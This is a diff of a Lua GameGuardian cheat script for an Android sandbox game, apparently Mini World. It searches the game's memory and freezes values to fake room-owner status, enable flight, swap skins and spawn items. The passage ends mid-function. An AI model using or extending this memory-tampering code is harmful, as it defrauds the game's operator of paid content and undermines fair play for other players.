+{["value"] =1127481344, ["type"] = 4},
+{["lv"] = 1120403456, ["offset"] = -16, ["type"] = 4},
 }
 qmxg = {
-{["value"]=-999,["offset"]=4,["type"]=16},
+{["value"]=-9999,["offset"]=-12,["type"]=16},
 }
 xqmnb(qmnb)
  elseif F == 2 then
 qmnb = {
 {["memory"] = 16384},
 {["name"] = "摇头"},
-{["value"] =1120403456, ["type"] = 4},
-{["lv"] = 1127481344, ["offset"] = 12, ["type"] = 4},
+{["value"] =1127481344, ["type"] = 4},
+{["lv"] = 1120403456, ["offset"] = -16, ["type"] = 4},
 }
 qmxg = {
-{["value"]=30,["offset"]=4,["type"]=16},
+{["value"]=30,["offset"]=-12,["type"]=16},
 }
 xqmnb(qmnb)
 end
@@ -3820,7 +3980,7 @@ function yf24()
 qmnb = {
 {["memory"] = 4},
 {["name"] = "足球模式"},
-{["value"] =1416177161 , ["type"] = 4},
+{["value"] =lq , ["type"] = 4},
 {["lv"] = 0, ["offset"] = -280, ["type"] = 4},
 }
 qmxg = {
@@ -3831,20 +3991,21 @@ gg.clearResults()
 end
 
 
+
 function yf25()
-zh1= gg.prompt({"请输入自己迷你号"},{[1]=""},{[1]="number"})[1]
 qmnb = {
 {["memory"] = 4},
-{["name"] = "足球模式"},
-{["value"] = zh1, ["type"] = 4},
-{["lv"] = zh1, ["offset"] = 880, ["type"] = 4},
+{["name"] = "篮足球模式"},
+{["value"] =lq , ["type"] = 4},
+{["lv"] = 1, ["offset"] = -280, ["type"] = 4},
 }
 qmxg = {
-{["value"] = 0, ["offset"] = 600, ["type"] = 4, ["freeze"] = true},
+{["value"] = 0, ["offset"] = -280, ["type"] = 4},
 }
 xqmnb(qmnb)
 gg.clearResults()
 end
+
 
 
 
@@ -4278,32 +4439,9 @@ end
 
 
 function yf33()
-gg.toast("也可以取消黑名单 出现异常请恢复")
-F = gg.alert("☁请选择｛开 关｝❄️","☣️🏼开☣️🏻","🏾️☢️关☢️")
- if  F~=1 and F~=2 then
- gg.toast("你未选择开关默认取消")
-    gg.toast("☢️你未选择｛开 关｝☢️")
-  else 
-  end
-if  F== 1 then
-gg.toast("正在开启，请稍等")
 gg.clearResults()
 	 gg.setRanges(4)
-	 gg.searchNumber("16777664;16777216", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
-	 gg.searchNumber("16777216", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
-	 jg=gg.getResults(100)
-	 sl=gg.getResultCount()
-	 if sl>100 then sl=100 end
-	 for i = 1, sl do
-	 	 dzy=jg[i].address
-	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_DWORD,freeze = true,value = 16777472}})
-	 end
-	 gg.toast("开启成功")
-	 gg.clearResults()
-elseif F == 2 then gg.toast("正在开启，请稍等")
-gg.clearResults()
-	 gg.setRanges(4)
-	 gg.searchNumber("16777664;16777472", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
+	 gg.searchNumber("16,777,472;131072;1028443341", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
 	 gg.searchNumber("16777472", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
 	 jg=gg.getResults(100)
 	 sl=gg.getResultCount()
@@ -4312,10 +4450,12 @@ gg.clearResults()
 	 	 dzy=jg[i].address
 	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_DWORD,freeze = true,value = 16777216}})
 	 end
-	 gg.toast("开启成功")
+	 gg.toast("成功")
 	 gg.clearResults()
 end
-end
+
+
+
 
 
 function yf34()
@@ -4507,21 +4647,19 @@ end
 
 
  function yf41()
+b31a= gg.prompt({"输入房主迷你号"},{[1]=0},{[1]="number"})[1]
+qmnb = {
+{["memory"] = 4},
+{["name"] = "伪房主"},
+{["value"] = b31a, ["type"] = 4},
+{["lv"] = 2, ["offset"] = 44, ["type"] = 4},
+}
+qmxg = {
+{["value"] = 3, ["offset"] = 44, ["type"] = 4,freeze =true},
+}
+xqmnb(qmnb)
 gg.clearResults()
-	 gg.setRanges(262207)
-	 gg.searchNumber("75;0;25", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
-	 gg.searchNumber("75", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
-	 jg=gg.getResults(1500)
-	 sl=gg.getResultCount()
-	 if sl>1500 then sl=1500 end
-	 for i = 1, sl do
-	 	 dzy=jg[i].address
-	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_FLOAT,freeze = true,value = 75}})
-	 end
-	 gg.toast("为什么要背叛我......")
-	 gg.clearResults()
 end
-
 
 
 
@@ -4561,26 +4699,28 @@ F = gg.alert("🔰请选择｛开 关｝🔰","🍁开🍁","🍁️关🍁️�
   else 
   end
 if  F== 1 then
- qmnb = {
-{["memory"] = 4},
-{["name"] = "飞行"},
-{["value"] =1421 , ["type"] = 4},
-{["lv"] = 16777216, ["offset"] = -12, ["type"] = 4},
+qmnb={
+{["memory"]=4},
+{["name"]="伪飞行"},
+{["value"]=-1020002304,["type"]=4},
+{["lv"]=-1046478848,["offset"]=-4,["type"]=4}
+
 }
-qmxg = {
-{["value"] = 16777472, ["offset"] = -12, ["type"] = 4},
+qmxg={
+{["value"]=16777472,["offset"]=-76,["type"]=4,["freeze"]=true}
 }
 xqmnb(qmnb)
 gg.clearResults()
  elseif  F== 2 then
- qmnb = {
-{["memory"] = 4},
-{["name"] = "飞行"},
-{["value"] =1421 , ["type"] = 4},
-{["lv"] = 16777472, ["offset"] = -12, ["type"] = 4},
+ qmnb={
+{["memory"]=4},
+{["name"]="伪飞行"},
+{["value"]=-1020002304,["type"]=4},
+{["lv"]=-1046478848,["offset"]=-4,["type"]=4}
+
 }
-qmxg = {
-{["value"] = 16777216, ["offset"] = -12, ["type"] = 4},
+qmxg={
+{["value"]=16777216,["offset"]=-76,["type"]=4,["freeze"]=true}
 }
 xqmnb(qmnb)
 gg.clearResults()
@@ -4718,6 +4858,1352 @@ xqmnb(qmnb)
 end
 
 
+
+
+
+
+
+function yf47()
+ gg.clearResults()
+	 gg.setRanges(4)
+	 gg.searchNumber("75F;15,004D", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
+	 gg.searchNumber("75", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
+	 jg=gg.getResults(100)
+	 sl=gg.getResultCount()
+	 if sl>100 then sl=100 end
+	 for i = 1, sl do
+	 	 dzy=jg[i].address
+	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_FLOAT,freeze = true,value = 75}})
+	 end
+	 gg.toast("")
+	 gg.clearResults()
+end
+
+
+
+
+function yf48()
+F = gg.alert("🔰先在地图选择队伍里面选择一次，否则没用｝🔰","🍁开🍁","🍁️关🍁️️")
+ if  F~=1 and F~=2 then
+ gg.toast("你未选择开关默认取消")
+    gg.toast("📌你未选择｛开 关｝")
+  else 
+  end
+if  F== 1 then
+qmnb={
+{["memory"]=4},
+{["name"]=""},
+{["value"]=2100,["type"]=4},
+{["lv"]=16777216,["offset"]=28,["type"]=4},
+}
+qmxg={
+{["value"]=16777472,["offset"]=28,["type"]=4}
+}
+xqmnb(qmnb)
+gg.clearResults()
+ elseif  F== 2 then
+qmnb={
+{["memory"]=4},
+{["name"]=""},
+{["value"]=2100,["type"]=4},
+{["lv"]=16777472,["offset"]=28,["type"]=4},
+}
+qmxg={
+{["value"]=16777216,["offset"]=28,["type"]=4}
+}
+xqmnb(qmnb)
+gg.clearResults()
+end
+end
+
+
+
+
+
+function yf49()
+qmnb={
+{["memory"]=4},
+{["name"]="先打开一次商店"},
+{["value"]=58982400,["type"]=4},
+{["lv"]=16777216,["offset"]=32,["type"]=4},
+}
+qmxg={
+{["value"]=16777472,["offset"]=32,["type"]=4}
+}
+xqmnb(qmnb)
+	 end
+	 
+	 
+	 
+	 
+	 
+function yf50()	 
+SN = gg.multiChoice({
+             "𒅒🧊第一步(大厅开)𒅒🧊",
+             "𒅒🧊第二步(房间开)𒅒🧊",
+	  "🍊返 回 主 页🍊",
+ }, nil, "💋一定要有妙妙，修改任何皮肤，没有就修改不了，不会吞皮肤💋")
+if SN == nil then else
+if SN[1]==true then c1y() end
+if SN[2]==true then cy2() end
+	 if SN[3]==true then Main() end end
+ FX=0 end
+function c1y()
+qmnb = {
+{["memory"] = 4},
+{["name"] = ""},
+{["value"] = a, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 4, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 8, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 12, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 16, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 20, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 24, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 28, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 32, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 36, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 40, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 44, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 48, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 52, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 56, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 60, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 160, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 164, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 168, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 172, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 176, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 180, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 184, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 96, ["type"] = 4},
+}
+qmxg = {{["value"] = 0, ["offset"] = 0x64, ["type"] = 4, ["freeze"] = true},}
+xqmnb(qmnb)
+end
+
+function cy2()
+A2=gg.prompt({"输入你要的皮肤代码"},{[1]="151"},{[1]="number"})[1]
+qmnb = {
+{["memory"] = 4},
+{["name"] = ""},
+{["value"] = 18260246528, ["type"] = 32},
+{["lv"] = 4, ["offset"] = 0xA4, ["type"] = 32},
+{["lv"] = 1079918592, ["offset"] = -16, ["type"] = 4},
+}
+qmxg = {{["value"] = A2, ["offset"] = -20, ["type"] = 64},}
+xqmnb(qmnb)
+end
+	 
+	function yf51()
+qmnb = {
+{["memory"] = 4},
+{["name"] = "仙人掌改桃木图腾"},
+{["value"] = 1731093611, ["type"] = 4},
+{["lv"] = 1668246626, ["offset"] = -4, ["type"] = 4},
+{["lv"] = 242, ["offset"] = 260, ["type"] = 4},
+{["lv"] = 12, ["offset"] = 300, ["type"] = 4},
+{["lv"] = 100, ["offset"] = 316, ["type"] = 4},
+}
+qmxg = {
+{["value"] = 726, ["offset"] = 260, ["type"] = 4},
+
+}
+xqmnb(qmnb)
+end 
+	 
+	 
+	 
+	 
+	 function yf52()
+	 SN = gg.multiChoice({
+             "𒅒🧊生存奖励杯𒅒🧊",
+             "𒅒🧊破坏𒅒🧊",
+              "𒅒🧊击飞𒅒🧊",
+              "𒅒🧊召唤𒅒🧊",
+              "𒅒🧊加状态𒅒🧊",
+              "𒅒🧊治疗𒅒🧊",
+              "𒅒🧊召唤方块𒅒🧊",          
+	  "🍊返 回 主 页🍊",
+ }, nil, "❤️打开生存奖励杯领取💋")
+if SN == nil then else
+if SN[1]==true then djj520() end
+if SN[2]==true then djj521() end
+if SN[3]==true then djj522() end
+if SN[4]==true then djj523() end
+if SN[5]==true then djj524() end
+if SN[6]==true then djj525() end
+if SN[7]==true then djj526() end
+	 if SN[8]==true then Main() end end
+ FX=0 end
+ 
+ 
+ function djj520()  
+ qmnb = {
+{["memory"] = 4},
+{["name"] = ""},
+{["value"] = 1124859904, ["type"] = 4},
+{["lv"] = -1047527424, ["offset"] = -4, ["type"] = 4},
+{["lv"] = 1065353216, ["offset"] = 0x38, ["type"] = 4},
+{["lv"] = 1065353216, ["offset"] = -0x20, ["type"] = 4},
+{["lv"] = 1113063424, ["offset"] = -0x14, ["type"] = 4},
+{["lv"] = 1113063424, ["offset"] = -0x18, ["type"] = 4},
+{["lv"] = 1050253722, ["offset"] = 0xA0, ["type"] = 4},
+{["lv"] = 1056964608, ["offset"] = 0x98, ["type"] = 4},
+{["lv"] = 16777216, ["offset"] = -0x4C, ["type"] = 4},
+}
+qmxg = {{["value"] = 16777472, ["offset"] = -0x4C, ["type"] = 4, ["freeze"] = true},}
+xqmnb(qmnb)
+gg.clearResults()
+end
+
+ function djj521()  
+ qmnb = {
+{["memory"] = 4},
+{["name"] = ""},
+{["value"] = 11012, ["type"] = 4},
+{["lv"] = 2, ["offset"] = -4, ["type"] = 4},
+{["lv"] = 1, ["offset"] = -8, ["type"] = 4},
+{["lv"] = 5, ["offset"] = -16, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 20, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 28, ["type"] = 4},
+{["lv"] = 1, ["offset"] = 32, ["type"] = 4},
+{["lv"] = 11013, ["offset"] = -928, ["type"] = 4},
+
+}
+qmxg = {
+{["value"] = 0, ["offset"] =4, ["type"] = 4},
+{["value"] = 0, ["offset"] =8, ["type"] = 4},
+{["value"] = 11551, ["offset"] =16, ["type"] = 4},
+{["value"] = 99, ["offset"] =24, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x39C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x398, ["type"] = 4},
+{["value"] = 11551, ["offset"] =-0x390, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x388, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x73C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x738, ["type"] = 4},
+{["value"] = 11551, ["offset"] =-0x730, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x728, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0xADC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0xAD8, ["type"] = 4},
+{["value"] = 11551, ["offset"] =-0xAD0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0xAC8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0xE7C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0xE78, ["type"] = 4},
+{["value"] = 11551, ["offset"] =-0xE70, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0xE68, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x121C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x1218, ["type"] = 4},
+{["value"] = 11551, ["offset"] =-0x1210, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x1208, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x15BC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x15B8, ["type"] = 4},
+{["value"] = 11551, ["offset"] =-0x15B0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x15A8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x195C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x1958, ["type"] = 4},
+{["value"] = 11551, ["offset"] =-0x1950, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x1948, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x1CFC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x1CF8, ["type"] = 4},
+{["value"] = 11551, ["offset"] =-0x1CF0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x1CE8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x209C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x2098, ["type"] = 4},
+{["value"] = 11551, ["offset"] =-0x2090, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x2088, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x243C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x2438, ["type"] = 4},
+{["value"] = 11551, ["offset"] =-0x2430, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x2428, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x27DC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x27D8, ["type"] = 4},
+{["value"] = 11551, ["offset"] =-0x27D0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x27C8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x2B7C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x2B78, ["type"] = 4},
+{["value"] = 11551, ["offset"] =-0x2B70, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x2B68, ["type"] = 4},
+
+ }
+xqmnb(qmnb)
+end
+ function djj522()  
+ qmnb = {
+{["memory"] = 4},
+{["name"] = ""},
+{["value"] = 11012, ["type"] = 4},
+{["lv"] = 2, ["offset"] = -4, ["type"] = 4},
+{["lv"] = 1, ["offset"] = -8, ["type"] = 4},
+{["lv"] = 5, ["offset"] = -16, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 20, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 28, ["type"] = 4},
+{["lv"] = 1, ["offset"] = 32, ["type"] = 4},
+{["lv"] = 11013, ["offset"] = -928, ["type"] = 4},
+
+}
+qmxg = {
+{["value"] = 0, ["offset"] =4, ["type"] = 4},
+{["value"] = 0, ["offset"] =8, ["type"] = 4},
+{["value"] = 11555, ["offset"] =16, ["type"] = 4},
+{["value"] = 99, ["offset"] =24, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x39C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x398, ["type"] = 4},
+{["value"] = 11555, ["offset"] =-0x390, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x388, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x73C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x738, ["type"] = 4},
+{["value"] = 11555, ["offset"] =-0x730, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x728, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0xADC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0xAD8, ["type"] = 4},
+{["value"] = 11555, ["offset"] =-0xAD0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0xAC8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0xE7C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0xE78, ["type"] = 4},
+{["value"] = 11555, ["offset"] =-0xE70, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0xE68, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x121C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x1218, ["type"] = 4},
+{["value"] = 11555, ["offset"] =-0x1210, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x1208, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x15BC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x15B8, ["type"] = 4},
+{["value"] = 11555, ["offset"] =-0x15B0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x15A8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x195C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x1958, ["type"] = 4},
+{["value"] = 11555, ["offset"] =-0x1950, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x1948, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x1CFC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x1CF8, ["type"] = 4},
+{["value"] = 11555, ["offset"] =-0x1CF0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x1CE8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x209C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x2098, ["type"] = 4},
+{["value"] = 11555, ["offset"] =-0x2090, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x2088, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x243C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x2438, ["type"] = 4},
+{["value"] = 11555, ["offset"] =-0x2430, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x2428, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x27DC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x27D8, ["type"] = 4},
+{["value"] = 11555, ["offset"] =-0x27D0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x27C8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x2B7C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x2B78, ["type"] = 4},
+{["value"] = 11555, ["offset"] =-0x2B70, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x2B68, ["type"] = 4},
+
+ }
+xqmnb(qmnb)
+end
+ function djj523()  
+ qmnb = {
+{["memory"] = 4},
+{["name"] = ""},
+{["value"] = 11012, ["type"] = 4},
+{["lv"] = 2, ["offset"] = -4, ["type"] = 4},
+{["lv"] = 1, ["offset"] = -8, ["type"] = 4},
+{["lv"] = 5, ["offset"] = -16, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 20, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 28, ["type"] = 4},
+{["lv"] = 1, ["offset"] = 32, ["type"] = 4},
+{["lv"] = 11013, ["offset"] = -928, ["type"] = 4},
+
+}
+qmxg = {
+{["value"] = 0, ["offset"] =4, ["type"] = 4},
+{["value"] = 0, ["offset"] =8, ["type"] = 4},
+{["value"] = 11556, ["offset"] =16, ["type"] = 4},
+{["value"] = 99, ["offset"] =24, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x39C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x398, ["type"] = 4},
+{["value"] = 11556, ["offset"] =-0x390, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x388, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x73C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x738, ["type"] = 4},
+{["value"] = 11556, ["offset"] =-0x730, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x728, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0xADC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0xAD8, ["type"] = 4},
+{["value"] = 11556, ["offset"] =-0xAD0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0xAC8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0xE7C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0xE78, ["type"] = 4},
+{["value"] = 11556, ["offset"] =-0xE70, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0xE68, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x121C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x1218, ["type"] = 4},
+{["value"] = 11556, ["offset"] =-0x1210, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x1208, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x15BC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x15B8, ["type"] = 4},
+{["value"] = 11556, ["offset"] =-0x15B0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x15A8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x195C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x1958, ["type"] = 4},
+{["value"] = 11556, ["offset"] =-0x1950, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x1948, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x1CFC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x1CF8, ["type"] = 4},
+{["value"] = 11556, ["offset"] =-0x1CF0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x1CE8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x209C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x2098, ["type"] = 4},
+{["value"] = 11556, ["offset"] =-0x2090, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x2088, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x243C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x2438, ["type"] = 4},
+{["value"] = 11556, ["offset"] =-0x2430, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x2428, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x27DC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x27D8, ["type"] = 4},
+{["value"] = 11556, ["offset"] =-0x27D0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x27C8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x2B7C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x2B78, ["type"] = 4},
+{["value"] = 11556, ["offset"] =-0x2B70, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x2B68, ["type"] = 4},
+
+ }
+xqmnb(qmnb)
+end
+ function djj524()  
+ qmnb = {
+{["memory"] = 4},
+{["name"] = ""},
+{["value"] = 11012, ["type"] = 4},
+{["lv"] = 2, ["offset"] = -4, ["type"] = 4},
+{["lv"] = 1, ["offset"] = -8, ["type"] = 4},
+{["lv"] = 5, ["offset"] = -16, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 20, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 28, ["type"] = 4},
+{["lv"] = 1, ["offset"] = 32, ["type"] = 4},
+{["lv"] = 11013, ["offset"] = -928, ["type"] = 4},
+
+}
+qmxg = {
+{["value"] = 0, ["offset"] =4, ["type"] = 4},
+{["value"] = 0, ["offset"] =8, ["type"] = 4},
+{["value"] = 11557, ["offset"] =16, ["type"] = 4},
+{["value"] = 99, ["offset"] =24, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x39C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x398, ["type"] = 4},
+{["value"] = 11557, ["offset"] =-0x390, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x388, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x73C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x738, ["type"] = 4},
+{["value"] = 11557, ["offset"] =-0x730, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x728, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0xADC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0xAD8, ["type"] = 4},
+{["value"] = 11557, ["offset"] =-0xAD0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0xAC8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0xE7C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0xE78, ["type"] = 4},
+{["value"] = 11557, ["offset"] =-0xE70, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0xE68, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x121C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x1218, ["type"] = 4},
+{["value"] = 11557, ["offset"] =-0x1210, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x1208, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x15BC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x15B8, ["type"] = 4},
+{["value"] = 11557, ["offset"] =-0x15B0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x15A8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x195C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x1958, ["type"] = 4},
+{["value"] = 11557, ["offset"] =-0x1950, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x1948, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x1CFC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x1CF8, ["type"] = 4},
+{["value"] = 11557, ["offset"] =-0x1CF0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x1CE8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x209C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x2098, ["type"] = 4},
+{["value"] = 11557, ["offset"] =-0x2090, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x2088, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x243C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x2438, ["type"] = 4},
+{["value"] = 11557, ["offset"] =-0x2430, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x2428, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x27DC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x27D8, ["type"] = 4},
+{["value"] = 11557, ["offset"] =-0x27D0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x27C8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x2B7C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x2B78, ["type"] = 4},
+{["value"] = 11557, ["offset"] =-0x2B70, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x2B68, ["type"] = 4},
+
+ }
+xqmnb(qmnb)
+end
+ function djj525()  
+ qmnb = {
+{["memory"] = 4},
+{["name"] = ""},
+{["value"] = 11012, ["type"] = 4},
+{["lv"] = 2, ["offset"] = -4, ["type"] = 4},
+{["lv"] = 1, ["offset"] = -8, ["type"] = 4},
+{["lv"] = 5, ["offset"] = -16, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 20, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 28, ["type"] = 4},
+{["lv"] = 1, ["offset"] = 32, ["type"] = 4},
+{["lv"] = 11013, ["offset"] = -928, ["type"] = 4},
+
+}
+qmxg = {
+{["value"] = 0, ["offset"] =4, ["type"] = 4},
